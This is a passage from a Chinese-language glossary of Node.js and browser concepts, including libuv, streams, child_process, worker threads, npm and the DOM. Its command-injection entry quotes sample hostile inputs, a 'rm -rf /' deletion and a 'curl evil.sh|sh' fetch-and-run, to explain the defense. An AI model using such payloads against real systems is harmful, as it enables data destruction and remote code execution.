libuv 是 Node 底层的**跨平台异步 I/O 库**（C 语言编写），它把各操作系统互不相同的 I/O 机制（Linux 的 epoll、macOS 的 kqueue、Windows 的 IOCP）统一成一套接口，并实现了**事件循环本身**与**线程池**。换句话说：V8 负责跑 JS，libuv 负责「让等待变得高效」。关键细节：凡是操作系统没有提供异步接口的操作（文件读写、DNS 查询、`zlib` 压缩、`crypto` 的部分计算），libuv 都丢进线程池执行；`process.versions.uv` 可以查到版本号。

也见 [Event Loop（事件循环）](#event-loop事件循环)、[Thread Pool（线程池）](#thread-pool线程池)。

示例：[`26_node_core/01_process_object.js`](26_node_core/01_process_object.js)

### Thread Pool（线程池）

线程池是 libuv 内部维护的一小组工作线程（默认 **4** 个，可用环境变量 `UV_THREADPOOL_SIZE` 调整），用来执行那些操作系统不提供异步接口的任务：文件读写、DNS 解析、`zlib`、部分 `crypto`。关键细节：池子大小固定，**一旦被占满，后续任务只能排队**——比如同时发起 8 个耗时的 `pbkdf2` 哈希，后 4 个会明显变慢，这正是「加密操作会拖慢文件读取」的常见故障原因。**常见误解**：以为「Node 是单线程」——准确说法是「**单个 JS 执行线程 + 一个线程池 + 一个事件循环**」，真正并行干活的可以是主线程之外的多个线程。

也见 [libuv（libuv）](#libuvlibuv)、[Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)。

示例：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### node:fs（文件系统模块）

`node:fs` 是 Node 的文件系统模块，提供读、写、追加、复制、重命名、删除、创建目录、读取目录、查看文件元信息等能力。它有同步、回调、Promise 三套 API（也见 [Callback API / Promise API / Sync API](#callback-api-promise-api-sync-api三套-api-风格)），选项对象里支持 `encoding`（不写则返回 `Buffer`）、`flag`（`'w'` 覆盖、`'a'` 追加）、`mode`。关键细节：**相对路径是相对 `process.cwd()` 而不是相对脚本文件**，这是「换个目录运行就找不到文件」的根源，稳妥做法是用 `import.meta.dirname` 拼绝对路径；另外多数 `fs` 调用需要自己处理 `ENOENT`、`EACCES` 等错误码。

也见 [node:path（路径模块与跨平台分隔符）](#nodepath路径模块与跨平台分隔符)、[Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）](#blocking-vs-non-blocking-io阻塞式与非阻塞式-io)。

示例：[`26_node_core/04_fs_sync.js`](26_node_core/04_fs_sync.js)、[`26_node_core/05_fs_callback.js`](26_node_core/05_fs_callback.js)、[`26_node_core/06_fs_promises.js`](26_node_core/06_fs_promises.js)

### node:path（路径模块与跨平台分隔符）

`node:path` 是一组**纯字符串运算**的路径处理函数：`join`（拼接并规范化）、`resolve`（相对转绝对）、`dirname`/`basename`/`extname`（拆解）、`parse`/`format`（拆成对象再拼回）、`relative`。关键细节：Windows 用反斜杠 `\`、POSIX 用正斜杠 `/`，`path.join` 会自动用当前平台的分隔符，而 `path.posix` 与 `path.win32` 是**固定行为的两套实现**——写跨平台工具或处理 URL 路径时应显式使用其中之一，否则同一份路径字符串在 Windows 与 Linux 上会得到不同结果。**常见误解**：以为 `join` 会做安全检查——它只拼字符串，`..` 照样能穿目录，防目录穿越要在业务层校验。

也见 [node:fs（文件系统模块）](#nodefs文件系统模块)、[__dirname vs import.meta.dirname（目录名变量）](#__dirname-vs-importmetadirname目录名变量)。

示例：[`26_node_core/02_path_module.js`](26_node_core/02_path_module.js)

### node:url & URLSearchParams（URL 模块与查询参数）

`node:url` 提供 Node 侧的 URL 处理能力，核心是两个 WHATWG 标准类：**`URL`**（解析、校验、读写 `protocol`/`host`/`pathname`/`search`/`hash`，并自动做百分号编码）与 **`URLSearchParams`**（把查询串当作可增删改查的键值集合，支持 `get`/`getAll`/`append`/`delete`/`sort`）。关键细节：**不要用字符串拼查询参数**——直接把值插进 URL 会在遇到 `&`、`=`、空格、中文时出错，而 `searchParams.set()` 会正确编码；`URL` 还能用来校验用户输入是不是合法地址（构造失败即抛错）。注意 `URL` 是全局类，浏览器与 Node 行为一致。

也见 [URL & URLSearchParams（URL 与查询参数）](#url-urlsearchparamsurl-与查询参数)、[node:path（路径模块与跨平台分隔符）](#nodepath路径模块与跨平台分隔符)。

示例：[`26_node_core/03_url_module.js`](26_node_core/03_url_module.js)、[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)

### Event-Driven（事件驱动）

事件驱动是一种**控制反转**的程序组织方式：程序不写成「从上到下做完所有事」的流水线，而是注册一堆回调，等外部事件（用户点击、数据到达、定时器到期）发生时由运行时回头调用。Node 的整个架构都建立在这个模型上——HTTP 服务器是 `request` 事件、流是 `data`/`end` 事件、进程是信号事件。关键细节：事件驱动让「等待」不再占用线程，但代价是**控制流被切碎**：错误处理要靠回调参数或 `error` 事件，顺序推理比同步代码难，这也是 Promise/`async-await` 出现的原因之一。

也见 [EventEmitter（事件发射器）](#eventemitter事件发射器)、[Publish/Subscribe（发布订阅）](#publishsubscribe发布订阅)。

示例：[`26_node_core/07_events_eventemitter.js`](26_node_core/07_events_eventemitter.js)、[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### EventEmitter（事件发射器）

`EventEmitter` 是 `node:events` 导出的类，是 Node 事件模型的**最小实现**：`on`/`addListener` 注册监听器、`emit` 触发同名事件、`once` 只监听一次、`off`/`removeListener` 取消、`removeAllListeners` 清空、`listenerCount` 统计。用法上通常让自定义类 `extends EventEmitter`，把内部状态变化广播出去。关键细节：**名为 `'error'` 的事件极其特殊**——没有监听器时 `emit('error')` 会直接抛出异常并可能杀死进程，所以任何会发错的发射器都必须挂一个 `error` 处理；另外默认最多 10 个监听器，超出会打印「可能内存泄漏」警告（可用 `setMaxListeners` 调整）。

也见 [Publish/Subscribe（发布订阅）](#publishsubscribe发布订阅)、[Event-Driven（事件驱动）](#event-driven事件驱动)、[Stream（流）](#stream流)。

示例：[`26_node_core/07_events_eventemitter.js`](26_node_core/07_events_eventemitter.js)

### Publish/Subscribe（发布订阅）

发布订阅是「**事件发射器**」这一机制在架构层面的名字：发布者只管把消息丢到频道上，订阅者只管登记自己感兴趣的频道，双方互不认识，从而把耦合从「谁调用谁」降到「谁关心什么事件」。在 Node 里它由 `EventEmitter` 直接支撑，在浏览器里对应 `addEventListener` 与 `BroadcastChannel`，在分布式系统里则演化为消息队列。关键细节：它天然带来**易于扩展、易于测试**的好处，但也带来调试困难（调用链是隐式的）与「订阅了没取消」导致的内存泄漏（组件卸载时必须 `off`/`removeEventListener`）。

也见 设计模式册的 Observer Pattern（观察者模式）示例：[`30_design_patterns/05_observer.js`](30_design_patterns/05_observer.js)、[`30_design_patterns/06_pubsub.js`](30_design_patterns/06_pubsub.js)。

示例：[`26_node_core/07_events_eventemitter.js`](26_node_core/07_events_eventemitter.js)

### Stream（流）

流是「**分块处理数据**」的抽象：把数据看成一连串有序的小块（chunk），而不是一次性读进内存。Node 有四类流：**可读流**（Readable，如 `fs.createReadStream`）、**可写流**（Writable，如 `fs.createWriteStream`）、**双工流**（Duplex，同时可读可写，如 TCP socket）、**转换流**（Transform，读写之间做加工，如 `zlib.createGzip`）。关键细节：流都继承自 `EventEmitter`，靠 `data`/`end`/`error`/`drain` 事件驱动；它可以是**对象模式**（每个 chunk 是任意 JS 值）。**常见误解**：以为流只是「读取大文件」的语法糖——它真正解决的是**内存占用与处理延迟**：用流复制 10GB 文件，内存占用是常数级。

也见 [Readable & Writable Stream（可读流与可写流）](#readable-writable-stream可读流与可写流)、[Duplex & Transform Stream（双工流与转换流）](#duplex-transform-stream双工流与转换流)、[Backpressure（背压）](#backpressure背压)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### Readable & Writable Stream（可读流与可写流）

可读流是数据的**来源**：通过 `'data'` 事件或 `for await...of` 异步迭代（或用 `read()` 主动拉取）拿 chunk，结束时发 `'end'`（Streams 的 `'end'` 只在消费完后触发，`'close'` 表示底层资源已释放）。可写流是数据的**去向**：`write(chunk)` 写入、`end(chunk?)` 声明结束，`finish` 事件表示数据已全部交给底层。关键细节：**`write()` 返回布尔值而不是 Promise**——`false` 意味着内部缓冲区已满，这是背压信号的起点；`end()` 只能调用一次，之后再 `write` 会报错。

也见 [Backpressure（背压）](#backpressure背压)、[pipe（管道）](#pipe管道)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### Duplex & Transform Stream（双工流与转换流）

**双工流（Duplex）**两端可独立读写（读与写是两个互不相干的通道），典型代表是 TCP/WebSocket 连接；**转换流（Transform）**是双工流的特例，写进去的数据经过 `_transform` 加工后从可读端吐出来，典型代表是 `zlib.createGzip()`、`crypto.createCipheriv()` 与 `node:stream` 的 `Transform` 基类。两者都常用于「管道中间环节」：在 `source.pipe(gzip).pipe(dest)` 这一串里，gzip 就是转换流。关键细节：写活数据的代码要处理 `_flush`（结束时吐出最后一块）与错误传播——转换流出错时不会自动中断整条管道，需要监听 `'error'` 手动销毁。

也见 [Stream（流）](#stream流)、[pipe（管道）](#pipe管道)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### pipe（管道）

`readable.pipe(writable)` 把可读流的输出直接接到可写流的输入，**自动帮你处理背压**：内部缓冲区满时暂停上游，`drain` 后再恢复，同时把 `'end'` 转成 `end()`。链式调用 `a.pipe(b).pipe(c)` 就能搭出数据处理流水线，这是流最常用的用法。关键细节：`pipe` **不会自动转发错误**——上游出错时下游不会被关闭，容易造成句柄泄漏；因此生产代码更推荐 `stream.pipeline()`（会自动销毁所有流并把错误交给回调）或 `finished()`。

也见 [Backpressure（背压）](#backpressure背压)、[Stream（流）](#stream流)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### Backpressure（背压）

数据生产速度快于消费速度时的**反向压力**机制。流（stream）的 `write()` 在内部缓冲区满时返回 `false`，提示生产者应暂停写入、等 `drain` 事件再继续；Web Streams 则通过 `highWaterMark` 与 `desiredSize` 表达同样的含义。忽略背压的后果是内存持续增长直到进程崩溃 —— 这是处理大文件或高吞吐数据时最典型的故障原因。**常见误解**：以为 `write()` 返回 `false` 表示写失败了——它只是「暂时别写了」的流量控制信号，数据仍然会被写入，只是排队积压了。

也见 [pipe（管道）](#pipe管道)、[Readable & Writable Stream（可读流与可写流）](#readable-writable-stream可读流与可写流)。

示例：[`26_node_core/08_streams_basics.js`](26_node_core/08_streams_basics.js)

### readline（逐行读取）

`node:readline` 把输入流按换行符切成一行行文本，通过 `'line'` 事件或异步迭代器交给你，适合做交互式命令行、逐行日志处理、大文件按行解析。两个常用入口：`readline.createInterface({ input, output })`（面向终端交互，支持 `question` 提问）与 `readline.createInterface({ input, crlfDelay: Infinity })`（面向文件/管道逐行遍历）。关键细节：处理 CRLF 与 LF 的差异要设置 `crlfDelay`；Windows 上路径与换行符的差异是这一模块最常见的坑；用 `for await (const line of rl)` 写法比事件更简洁，且便于 `break` 提前退出。

也见 [Stream（流）](#stream流)、[Process Signal / SIGTERM / SIGINT（进程信号）](#process-signal-sigterm-sigint进程信号)。

示例：[`26_node_core/09_readline_cli.js`](26_node_core/09_readline_cli.js)

### child_process（子进程）

`node:child_process` 让 Node 启动**别的进程**并与之通信，是「调用外部命令」的官方途径。四种主要方式构成一张二维表：**要不要经过 shell** × **要不要等结果全部返回**——`spawn`（不经过 shell、流式）、`exec`（经过 shell、缓冲全部输出）、`execFile`（不经过 shell、缓冲输出）、`fork`（专门启动 Node 脚本，并自带 IPC 通道）。关键细节：子进程的 stdout/stderr 是流，可以管道给父进程或其它进程；子进程**不会随父进程自动死亡**（除非显式处理），父进程退出后可能留下孤儿进程。

也见 [spawn / exec / execFile（三种启动方式）](#spawn-exec-execfile三种启动方式)、[Command Injection（命令注入）](#command-injection命令注入)。

示例：[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### spawn / exec / execFile（三种启动方式）

三者的取舍可以浓缩成两条判断：**输出量大不大**、**要不要用 shell 语法**。`spawn` 不经过 shell，参数以数组传入，输出是流，适合长时间运行、输出巨大的命令（如 ffmpeg、`git log`）；`exec` 会启动 shell 并把完整命令当字符串解析，因此**支持管道、重定向、通配符**，但输出全部缓冲在内存里，且有**命令注入**风险，只适合短小、输入可信的命令；`execFile` 像 `spawn` 一样不经过 shell，但把结果缓冲后一次性回调，适合「跑一下、拿结果」的场景。**常见误解**：以为 `spawn` 也能写 `ls -la | grep x`——管道属于 shell 语法，`spawn` 下会被当成普通参数。

也见 [child_process（子进程）](#child_process子进程)、[Command Injection（命令注入）](#command-injection命令注入)。

示例：[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### Command Injection（命令注入）

命令注入指**用户输入被拼进命令行字符串并交给 shell 解释**，导致攻击者能执行任意命令（如输入 `; rm -rf /` 或 `$(curl evil.sh|sh)`）。它出现在 `child_process.exec`、`execSync` 以及任何带 `shell: true` 的调用中，是服务端最危险的漏洞类型之一。防御方式是**根本性的**：改用 `spawn`/`execFile` 并把参数作为数组传递（`shell: false`），这样参数永远不会被 shell 重新解析；如果必须用 shell，就用严格白名单校验输入、避免 `;`、`|`、`&`、`$`、反引号等元字符，并遵循最小权限原则。**常见误解**：以为「把引号转义一下就安全了」——不同平台与 shell 的转义规则不一致，转义永远不是可靠方案。

也见 [spawn / exec / execFile（三种启动方式）](#spawn-exec-execfile三种启动方式)，以及安全册的 [`32_security_and_best_practices/01_input_validation.js`](32_security_and_best_practices/01_input_validation.js)。

示例：[`26_node_core/10_child_process.js`](26_node_core/10_child_process.js)

### Worker Threads & Main Thread（工作线程与主线程）

**主线程**是 Node 启动时唯一执行 JS 的线程，事件循环跑在这里；**`node:worker_threads`** 让一个进程拥有多个 JS 执行线程，每个 worker 有独立的 V8 实例、独立的事件循环与独立的内存堆，通过消息传递（`postMessage`）或共享内存（`SharedArrayBuffer`）通信。它解决的是**CPU 密集型任务卡住事件循环**的问题：把大循环、压缩、加密、图像处理丢给 worker，主线程继续响应请求。关键细节：worker 有启动成本（毫秒级，别为小任务创建），`worker.terminate()` 是强制结束；`cluster` 解决的是「多进程利用多核」，而 worker 解决的是「一个进程内真并行」——两者不要混淆。

也见 [Concurrency vs Parallelism（并发与并行）](#concurrency-vs-parallelism并发与并行)、[Thread Pool（线程池）](#thread-pool线程池)。

示例：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### SharedArrayBuffer（共享内存缓冲区）

`SharedArrayBuffer`（SAB）是一块**可以被多个线程同时读写**的内存，与普通 `ArrayBuffer` 的关键区别在于：普通缓冲区传给 worker 时会**结构化克隆（复制一份）**，而 SAB 传过去的是同一块内存的引用，任何线程的修改立刻对其它线程可见。它带来的好处是零拷贝与超高速数据共享（适合图像处理、实时计算），代价是**必须自己处理同步**。关键细节：SAB 在浏览器里需要跨源隔离（COOP/COEP 响应头）才能使用，在 Node 里则可以直接用；它不能直接存放普通 JS 对象，必须通过 TypedArray 视图读写数值。

也见 [Atomics（原子操作）](#atomics原子操作)、[Race Condition（竞态条件）](#race-condition竞态条件)，以及二进制册的 [`24_typed_arrays/01_arraybuffer_basics.js`](24_typed_arrays/01_arraybuffer_basics.js)。

示例：[`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)

### Atomics（原子操作）

`Atomics` 是一组**保证不会被线程调度打断**的内存操作（`load`、`store`、`add`、`sub`、`exchange`、`compareExchange`、`wait`、`notify`），专为 `SharedArrayBuffer` 而设。为什么需要它：普通读写可能被拆成「读—改—写」三步，两个线程交叉执行就会丢更新（而 JS 又没有锁），`Atomics.add` 则保证这一系列动作整体完成。关键细节：`Atomics.wait`/`notify` 是线程间的等待/唤醒原语（不能在主线程用 `wait`，否则会抛错）；`Atomics` 只对整数有效，浮点数的原子操作需要绕道 `Int32Array`/`Float64Array` 组合。

也见 [SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffer共享内存缓冲区)、[Race Condition（竞态条件）](#race-condition竞态条件)。

示例：[`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)

### Race Condition（竞态条件）

竞态条件指**代码的执行结果取决于多个任务被调度的先后顺序**，因而变得不可预测：同一段代码大多数时候正确，偶尔丢数据或算错。在 JS 里它有两副面孔：单线程内的**异步竞态**（并发请求回到顺序不定、`await` 交错导致「先检查后使用」失效、经典的 `read-modify-write` 丢失更新），以及共享内存下的**真并行数据竞争**（多个 worker 同时改同一块 `SharedArrayBuffer`）。对策相应也有两类：异步侧用「**单一数据源 + 队列/串行化 + 版本号或幂等**」消除交错；共享内存侧用 `Atomics` 或消息传递替代共享状态。**常见误解**：以为「JS 单线程就没有竞态」——恰恰相反，`async` 代码里的交错是最常见的竞态来源。

也见 [Atomics（原子操作）](#atomics原子操作)、[SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffer共享内存缓冲区)。

示例：[`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)

### cluster（集群）

`node:cluster` 让一个 Node 程序**按 CPU 核数启动多个进程**（主进程 + N 个工作进程），共同监听同一个端口，从而真正吃满多核；主进程负责分发连接（Round-Robin 或由操作系统抢占），工作进程各自独立运行。它解决的问题与 `worker_threads` 不同：**cluster 是「多进程利用多核」，worker 是「一个进程内多线程并行」**，前者隔离性更好（一个崩溃不影响其它），后者共享内存更方便、启动更轻。关键细节：进程之间不共享内存，状态要放在外部存储（Redis、数据库）或通过 IPC 同步；现代部署更常见的是「一个容器一个进程 + 由编排系统横向扩容」，因此 cluster 更多出现在单机服务与 PM2 场景。

也见 [Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)、[Concurrency vs Parallelism（并发与并行）](#concurrency-vs-parallelism并发与并行)。

示例（对照：单进程内的多线程方案）：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### Concurrency vs Parallelism（并发与并行）

**并发**是「同时处理多件事」的能力（结构问题），**并行**是「同时执行多件事」（物理问题，需要多个计算单元）。Node 的经典卖点正是：**单线程也能高并发**——事件循环把等待时间重叠起来，一万个连接也能高效服务；但同一时刻真正在跑的 JS 只有一段，计算密集的任务不会因此变快。要并行就得引入 `worker_threads`（同进程多线程）或 `cluster`/多进程（多核），代价是通信、同步与调试复杂度上升。**常见误解**：把「异步」等同于「并行」——异步只是不阻塞，任务依然在同一个线程里排队执行。

也见 [Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)、[cluster（集群）](#cluster集群)。

示例：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### node:util（parseArgs / promisify / inspect）

`node:util` 是 Node 的通用工具箱，三个最常用的函数是：**`parseArgs`** 把 `process.argv` 解析成结构化的选项对象（声明 `options` 与 `allowPositionals`，比手写解析可靠得多，且不会像第三方库那样增加依赖）；**`promisify`** 把「错误优先回调」风格的函数转成返回 Promise 的版本（`promisify(fs.readFile)`），但要求原函数遵循 `(err, value)` 约定；**`inspect`** 把任意值格式化成人可读字符串，`console.log` 内部就用它，可通过 `depth`、`colors`、`compact` 等选项控制。关键细节：`util.inspect` 与 `JSON.stringify` 不同——它能递归处理循环引用、`Map`/`Set`、`Symbol`，调试对象时更靠谱。

也见 [process.argv（命令行参数）](#processargv命令行参数)、[Callback API / Promise API / Sync API（三套 API 风格）](#callback-api-promise-api-sync-api三套-api-风格)。

示例：[`26_node_core/12_os_and_util.js`](26_node_core/12_os_and_util.js)、[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### CommonJS（CJS 模块系统）

CommonJS 是 Node 早期唯一支持的模块系统：用 `require()` 同步加载、`module.exports` / `exports` 导出，**加载时执行、结果被缓存**，因此多次 `require` 同一模块只跑一次。它与 ESM（ES Module）的关键差别在于：CommonJS 是**运行时解析的动态加载**（可以在 `if` 里 `require`），导出的是值的**快照/拷贝**而非实时绑定，且没有顶层 `await`。本仓库 `package.json` 设置了 `"type": "module"`，所以 `.js` 文件都是 ESM，需要写 CommonJS 时必须用 `.cjs` 扩展名。**常见误解**：以为两者能随意混用——ESM 可以 `import` CJS（拿到默认导出对象），CJS 里 `require` ESM 却有限制。

也见 模块册的 [`19_modules/11_cjs_require.cjs`](19_modules/11_cjs_require.cjs)、[`19_modules/12_esm_vs_cjs.cjs`](19_modules/12_esm_vs_cjs.cjs)。

示例：[`27_web_apis/_cjs_like_module.cjs`](27_web_apis/_cjs_like_module.cjs)

### __dirname vs import.meta.dirname（目录名变量）

`__dirname` 与 `__filename` 是 **CommonJS 注入**的变量，表示当前模块所在目录/文件的绝对路径；ESM 里没有它们（用了会报 `__dirname is not defined`），替代品是 **`import.meta.dirname`** 与 **`import.meta.filename`**（Node 20.11+ 提供）或 `import.meta.url` 配合 `fileURLToPath`。为什么重要：**相对路径是相对 `process.cwd()` 解析的**，脚本换个目录运行就会找不到文件，用基目录变量拼出绝对路径才是稳的做法。**常见误解**：以为 `__dirname` 在 ESM 里也能用——它是 CJS 包装函数的参数，模块系统一换就不存在了。

也见 [CommonJS（CJS 模块系统）](#commonjscjs-模块系统)、[node:path（路径模块与跨平台分隔符）](#nodepath路径模块与跨平台分隔符)。

示例：[`26_node_core/02_path_module.js`](26_node_core/02_path_module.js)、[`19_modules/10_import_meta.js`](19_modules/10_import_meta.js)

### npm（Node 包管理器）

npm 是 Node 的官方包管理器（同时是命令行工具、包注册表与生态的代称），负责安装、升级、卸载依赖，管理 `package.json`（声明依赖与脚本）与 `package-lock.json`（锁定精确版本，保证可复现安装）。核心概念：`dependencies`（运行时依赖）、`devDependencies`（开发期依赖）、`peerDependencies`（插件声明的宿主版本）、`scripts`（可复用的命令别名）。关键细节：`^1.2.3` 允许升级次版本、`~1.2.3` 只允许补丁版本，锁定文件才是团队间「装出同一个结果」的保障；`npm ci` 会在 CI 里严格按锁文件安装。

也见 工具链册的 [`39_tooling_and_workflow/01_package_json_guide.js`](39_tooling_and_workflow/01_package_json_guide.js)、[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Global vs Local Install & npx（全局安装、本地安装与 npx）

**本地安装**（默认，`npm install pkg`）把包放进项目的 `node_modules`，只有本项目能用，`require`/`import` 才能找到它——这是绝大多数依赖的正确做法。**全局安装**（`npm install -g pkg`）把包放到系统级目录并加入 PATH，适合**命令行工具**（如 `eslint`、`typescript`），但会让不同项目被迫用同一版本，也无法在 `package.json` 里记录版本。**`npx`** 解决了这个矛盾：它可以直接运行（必要时临时下载）某个包的可执行文件，既能用本地 `node_modules/.bin` 里的版本，也能一次性试用全局没装的工具。**常见误解**：以为「全局装了就能 `import`」——全局包不在项目解析路径上，`import` 依然会失败。

也见 [npm（Node 包管理器）](#npmnode-包管理器)。

示例：[`29_npm_libraries/08_commander_cli.js`](29_npm_libraries/08_commander_cli.js)

### node:sqlite（内置 SQLite）

`node:sqlite` 是 Node 22 起内置的**实验性**模块，让 Node 零依赖拥有真正的持久化数据库能力，核心 API 是同步风格的 `DatabaseSync`：`exec`/`prepare`/`run`/`get`/`all`、事务与预处理语句。它适合示例、CLI 工具、桌面应用、单机服务这类「不需要独立数据库服务器」的场景；高并发生产环境仍更常用 `better-sqlite3` 等成熟库。关键细节：它是同步 API，因此**不要在大表上做重查询**（会卡住事件循环）；作为实验性模块应做**特性检测 + 降级**，避免在旧版本 Node 上直接崩掉。

也见 [`29_npm_libraries/15_database_and_orm.js`](29_npm_libraries/15_database_and_orm.js)、[Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）](#blocking-vs-non-blocking-io阻塞式与非阻塞式-io)。

### Built-in Test Runner（内置测试运行器）

Node 内置的测试运行器由 `node:test` 提供：`test()` 声明用例、`describe`/`it` 组织层级、`t.test()` 写子测试、断言用 `node:assert`（或 `assert/strict`），运行方式是 `node --test`。它最大的价值是**零依赖**——不用装 Jest/Vitest 就能写测试，也不需要额外的转译与配置，配合 `--experimental-test-coverage` 还能看覆盖率。关键细节：`test()` 支持返回 Promise 或接收 `t` 参数做异步断言，测试文件需要按 `*.test.js` 之类的命名约定被 `--test` 发现；它与 `node:assert` 的关系可以类比 Jest 与 `expect`。**常见误解**：以为「内置的就不够用」——对库与 CLI 项目而言它已足够，只有需要快照、浏览器环境或丰富 mock 时才需要第三方框架。

也见 [node:util（parseArgs / promisify / inspect）](#nodeutilparseargs-promisify-inspect)、[Exit Code（退出码）](#exit-code退出码)。

示例（在测试册中）：[`28_testing/02_node_test_runner.js`](28_testing/02_node_test_runner.js)、[`28_testing/03_assert_module.js`](28_testing/03_assert_module.js)

### node:http（HTTP 模块）

`node:http` 是 Node 自带的 HTTP 服务器与客户端实现，不依赖任何第三方库。服务端三步：`createServer((req, res) => {...})` 创建、监听 `'request'` 事件、`server.listen(port)` 启动；请求是**可读流**、响应是**可写流**，因此可以直接 `pipe` 文件内容或手动分段写入（适合 SSE、流式响应）。关键细节：`req.url` 只有路径与查询串（没有 host），需要 `new URL(req.url, 'http://' + req.headers.host)` 才能解析；`res.writeHead`/`res.setHeader` 要在写入正文前调用；框架（Express）本质就是对它的封装。另外要手动处理 `clientError`、超时与请求体大小限制，否则容易被慢连接拖住。

也见 [node:url & URLSearchParams（URL 模块与查询参数）](#nodeurl-urlsearchparamsurl-模块与查询参数)、[Stream（流）](#stream流)。

示例：[`26_node_core/15_http_server_client.js`](26_node_core/15_http_server_client.js)

## 浏览器与 Web API

### Browser Runtime（浏览器运行时）

浏览器运行时 = **JS 引擎（V8/JSC/SpiderMonkey）+ 渲染引擎（Blink/Gecko/WebKit）+ Web API**。JS 引擎只负责执行语言本身，页面渲染、网络、存储、图形全都由宿主提供；JS 通过绑定层的对象（`window`、`document`、`fetch`…）去调用它们。关键细节：**JS 主线程与渲染、样式计算、布局、绘制共享同一个线程**——一段长循环不只是「JS 慢」，而是整个页面卡住不响应，这正是「长任务」性能问题的根源。**常见误解**：以为 DOM 操作慢是因为 JS 慢——真正的原因是每次访问 DOM 都要跨语言边界进入渲染引擎。

也见 [Node.js Host Environment（Node 宿主环境）](#nodejs-host-environmentnode-宿主环境)、[Event & Event Listener（事件与事件监听器）](#event-event-listener事件与事件监听器)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### window（window 全局对象）

`window` 是浏览器里的全局对象（在脚本的顶层作用域中，`var` 声明的变量与函数声明都会变成它的属性），它同时扮演三个角色：**全局命名空间**、**当前标签页的窗口代理**（尺寸、滚动、`open`/`close`）与 **Web API 的入口**（`setTimeout`、`fetch`、`localStorage`、`location`、`navigator`、`document` 全是它的属性）。关键细节：`window` 有 `window.window === window` 的自引用；iframe 中的脚本访问父窗口要经过 `window.parent`/`postMessage`。**常见误解**：以为 `globalThis` 与 `window` 完全等价——在浏览器里它们指向同一对象，但 Node 里 `globalThis` 上没有 `window`。

也见 [document（document 对象）](#documentdocument-对象)、[Browser Runtime（浏览器运行时）](#browser-runtime浏览器运行时)。

示例：[`27_web_apis/01_dom_query.html`](27_web_apis/01_dom_query.html)

### document（document 对象）

`document` 是 `window.document`，代表**当前加载的 HTML 文档**，是 DOM 操作的入口：`querySelector`、`createElement`、`getElementById`、`body`/`head`/`documentElement`、`cookie`、`location`（在 document 上也有）、`title`、`readyState`。关键细节：脚本执行时机决定了元素存不存在——用 `defer`/`type="module"` 的脚本在解析完成后执行，普通 `<script>` 在写到的位置立即执行，此时后面的元素还没被解析出来，这是 `null` 报错的最常见原因。**常见误解**：以为 `document.write` 是通用写法——在页面加载完成后调用它会**清空整个文档**。

也见 [DOM（文档对象模型）](#dom文档对象模型)、[DOM Tree（DOM 树）](#dom-treedom-树)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### DOM（文档对象模型）

DOM（Document Object Model，文档对象模型）是浏览器把 HTML 解析成的一棵**对象树**：每个标签、文本、属性都是树上的一个对象（节点），JS 通过操作这些对象来改变页面。要点有三：DOM 是**语言无关的接口规范**（不只是给 JS 用）；DOM 对象是**宿主对象**，属性访问要跨语言边界，比操作普通 JS 对象昂贵；**页面是活文档**——改 DOM 会立即触发样式与布局的重算（不一定立即重绘）。**常见误解**：以为改 DOM 就等于改 HTML 源码——DOM 是内存中的树，源文件不变；用「查看源代码」看不到运行时改动，要用开发者工具的元素面板。

也见 [DOM Tree（DOM 树）](#dom-treedom-树)、[Node & Element（节点与元素）](#node-element节点与元素)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)、[`27_web_apis/01_dom_query.html`](27_web_apis/01_dom_query.html)

### DOM Tree（DOM 树）

DOM 树描述节点之间的**层级关系**：`document` 是根，`<html>` 是根元素，之下有 `<head>`/`<body>`，元素之间是父子与兄弟关系。每个节点都带一组导航属性：`parentNode`、`childNodes`（含文本节点）、`children`（只含元素）、`firstElementChild`/`lastElementChild`、`nextElementSibling`/`previousElementSibling`。关键细节：**HTML 里的空白与换行会生成文本节点**，所以 `childNodes.length` 常常比看到的标签数多，遍历元素时应该用 `children` 系列；`querySelectorAll` 返回的是**静态快照**，而 `children`/`childNodes` 是**实时集合**，会随 DOM 变化而变。

也见 [Node & Element（节点与元素）](#node-element节点与元素)、[DOM Manipulation & DocumentFragment（DOM 操作与文档片段）](#dom-manipulation-documentfragmentdom-操作与文档片段)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### Node & Element（节点与元素）

